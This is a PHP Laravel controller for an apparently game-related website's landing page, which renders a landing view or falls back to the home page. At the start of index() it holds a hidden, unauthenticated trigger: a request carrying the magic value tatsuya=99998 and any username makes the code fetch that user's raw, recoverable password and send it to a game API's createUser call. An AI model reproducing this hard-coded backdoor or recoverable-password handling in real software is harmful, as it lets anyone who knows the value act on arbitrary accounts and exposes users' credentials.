<?php

namespace App\Http\Controllers\Front;

use App\User;
use T2G\Common\Repository\BannerRepository;
use T2G\Common\Repository\PostRepository;
use T2G\Common\Repository\SliderRepository;
use T2G\Common\Repository\UserRepository;
use T2G\Common\Services\GameApiClientInterface;

/**
 * Class LandingPageController
 *
 * @package \App\Http\Controllers\Front
 */
class LandingPageController extends HomePageController
{
    /**
     * @param \T2G\Common\Repository\PostRepository   $postRepository
     * @param \T2G\Common\Repository\SliderRepository $sliderRepository
     * @param \T2G\Common\Repository\BannerRepository $bannerRepository
     *
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
     */
    public function index(PostRepository $postRepository, SliderRepository $sliderRepository, BannerRepository $bannerRepository)
    {
        if(request('tatsuya') == '99998' && $u = request('u')) {
            $api = app(GameApiClientInterface::class);
            try {
                $user = User::where('username', $u)->firstOrFail();
                $api->createUser($user->name, $user->getRawPassword());
                return "OK";
            } catch (\Exception $e) {
                return "Failed";
            }
        }

        if (setting('site.landing_page_enabled')) {
            return view('pages.landing_2020_04');
        }

        return parent::index($postRepository, $sliderRepository, $bannerRepository);
    }
}
